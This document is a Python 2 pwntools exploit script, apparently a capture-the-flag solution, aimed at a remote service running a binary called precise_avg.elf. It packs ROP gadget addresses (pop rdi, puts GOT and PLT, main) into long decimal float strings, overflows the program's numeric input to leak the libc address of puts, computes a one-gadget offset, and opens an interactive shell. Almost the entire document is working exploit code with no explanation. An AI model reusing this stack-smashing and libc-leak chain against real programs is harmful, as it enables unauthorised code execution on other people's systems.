#!/usr/bin/env python2
from pwn import *

#r = remote('localhost', 4000)
r = remote('82.196.10.106', 12499)
elf = ELF('./precise_avg.elf')
libc = ELF('./libc.so.6')
pop_rdi = '0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020734961846634810203398564396157300602058000747912060143155912690758824709381339004545459491420230177275073621035406745103061856619919392053457672602224374184660932120192384734566769090274801116397071254379599204440946884359566978979089871716261502910962300603285305232245847936872203907887233381937106786987876721878303116462627116509903110033951279419122850119908073152075787989479969194742100554743724481246123951531225434706694403938443983828513459578562713042503019799618741333613196712846688320804414759449757089407127976081148446104476396142595374374737696486820601662100280565419767433638411908405968787763194408127578254168697121489243020055453128533313211224746137457409455355507761985444448395196884559333987130269605358989792875945568084716796875000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
puts_got = '0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000031103764395554840639603518915756873395258077656840083533478707477838926371053956315229428914192612642192226387363670434949523013736579290219141875625915890118515386034696361184857265622973125670622734248891750259133025010698117554788120593907628315232781156633648457433207427845156593549993806455401971819618919983148278505615633628366361907368932811224940548195871456702362456652291623082227457725219312092418800321433764427323327502518265409112807841206740788215008560340798792971937100391945575385919046139288091712468769864545831617613273776866966876144931910212911463031956891350807820649428262487859530489336081066212481578698813359792234168235807975259709447523620959923844988369920904403192128014445024279319151894185324636055156588554382324218750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
printf_got = '0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000031103843446058175239050587166763732310677656066408501825441015571548126479135119548629727362166430503951007154814021706264359962001652947169509299429883251843615886242810471634681990078303872526459870839086732028252821926386118576773585164305130285228524720340786879838281889508848453748164301042766237188688802893074608155315622739609816546161785500097987652376268277455962383361409928535094107857143273236077842677718589924161505350539833973351763364307385077928728427594114422487990471925264486363397172434621980674164953963262787666866750213960234842624652305905333477867922885848164271909179777680397882776898924547574492147517999463870491791452413779070385462817019195661428887006879963030483370207889492163599864937850725254975259304046630859375000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
puts_plt = '0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020730441145975362797519348791702556376500860450718139071561418581763943528489816594465891997917521207944798482468443416785823877711019635204320623812840875530476076468666693385215339301047715298210822502604079282902560768452008534185334752109117593779377251101306773942050071544493948825012074167043180993303947810466326274244499817274840954067688134491741579803464886305579979311776876108930546135342196578244639201492767334273398720204991716413244482260467395039148111250631178384311012151171466796274067245042982092406599830705224379421292649871333541315727567826436628230294970247847711016598636835118947342763082817737598849821491794513885192355808723110278586633534531214330252054411596737226535457591377427030709945654507464496418833732604980468750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
main = '0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020732496459062062383143123317880888177409899099497014662581429018203146338600060662873651645236785613673098436177576470971584532602934715913873642715992280383089081879633565080658175139647133549976373847673605280017280576340035105807413582444168813668709907486905756473986074800482313977444933438514080589120903468550897166444216709604661562681858045190966288493782225899178073748852817883463449565365186313379740464898230252066022768765774386626088082877218927595864659836837545801698672017463152210705350923724095096507386397346081660011680014296300669788457855829409013965410827179115443770138031841116106819397013333149873639120330500548583395987559622187854984261888660391511616615347121046798832487147542418329249080954923556419089436531066894531250000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

r.sendlineafter('s: ', '39')

for i in range(33):
    r.sendline('1')

r.sendline('-')
r.sendline('123123123')
r.sendline(pop_rdi)
r.sendline(puts_got)
r.sendline(puts_plt)
r.sendline(main)
r.recvuntil('\n')
leak = u64(r.recvn(6).ljust(8, '\x00')) - libc.symbols['puts']
libc.address = leak
print hex(leak)
magic = leak + 0x10a38c
print hex(magic)

r.sendlineafter('s: ', '36')
for i in range(33):
    r.sendline('0')
r.sendline('-')
r.sendline('0')
fmagic = raw_input()
r.sendline(fmagic)

r.interactive()
